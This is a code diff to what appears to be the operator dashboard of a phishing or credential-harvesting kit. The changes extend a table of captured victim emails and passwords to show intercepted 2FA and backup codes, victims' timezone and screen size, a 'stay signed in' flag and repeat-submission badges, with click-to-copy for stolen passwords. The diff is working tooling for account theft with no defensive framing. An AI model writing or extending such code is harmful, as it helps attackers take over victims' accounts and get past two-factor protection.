@@ -343,7 +343,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 
   /* Credentials table — horizontal scroll */
   #cred-log{overflow-x:auto}
-  #cred-log table{min-width:560px}
+  #cred-log table{min-width:760px}
 
   /* Settings */
   .settings-grid{grid-template-columns:1fr}
@@ -1991,9 +1991,12 @@ function renderCredentials(creds) {
             ${th('timestamp','Time')}
             ${th('clientId','Client')}
             ${th('email','Email / Username')}
-            ${th('password','Password')}
+            ${th('password','Password / 2FA')}
             ${th('source','Source')}
             ${th('ip','IP')}
+            ${th('timezone','Timezone')}
+            ${th('screen','Screen')}
+            <th style="padding:7px 10px">Stay</th>
         </tr></thead>
         <tbody>${sorted.map((cr, i) => {
             seenClient[cr.clientId] = (seenClient[cr.clientId] || 0) + 1;
@@ -2001,14 +2004,20 @@ function renderCredentials(creds) {
             const repeatBadge = total > 1 ? `<span style="font-size:.55rem;background:#dc2626;color:#fff;border-radius:3px;padding:1px 4px;margin-left:4px" title="${n}/${total} submissions">REPEAT #${n}</span>` : '';
             const safeEmail = escHtml(cr.email||'');
             const safePw    = escHtml(cr.password||'');
+            const is2fa = safePw.startsWith('[2FA');
+            const pwColor = is2fa ? '#a78bfa' : '#4fc3f7';
+            const pwTitle = is2fa ? '2FA/Backup code' : 'Click to copy password';
             return `<tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
                 <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
                 <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}</td>
                 <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.clientId||'')}${repeatBadge}</td>
                 <td style="padding:7px 10px;font-weight:600;color:#f4b400;cursor:pointer" title="Click to copy email" onclick="copyCellVal(this.dataset.v,this)" data-v="${safeEmail}">${safeEmail}</td>
-                <td style="padding:7px 10px;font-family:monospace;color:#4fc3f7;letter-spacing:.05em;cursor:pointer" title="Click to copy password" onclick="copyCellVal(this.dataset.v,this)" data-v="${safePw}">${safePw}</td>
+                <td style="padding:7px 10px;font-family:monospace;color:${pwColor};letter-spacing:.05em;cursor:pointer" title="${pwTitle}" onclick="copyCellVal(this.dataset.v,this)" data-v="${safePw}">${safePw}</td>
                 <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.source||'')}</td>
                 <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.ip||'')}</td>
+                <td style="padding:7px 10px;color:var(--dim);font-size:.6rem;white-space:nowrap">${escHtml(cr.timezone||'—')}</td>
+                <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.screen||'—')}</td>
+                <td style="padding:7px 10px;color:${cr.staySignedIn?'#4ade80':'var(--dim)'}">${cr.staySignedIn ? '✓' : '—'}</td>
             </tr>`;}).join('')}
         </tbody></table>`;
 }
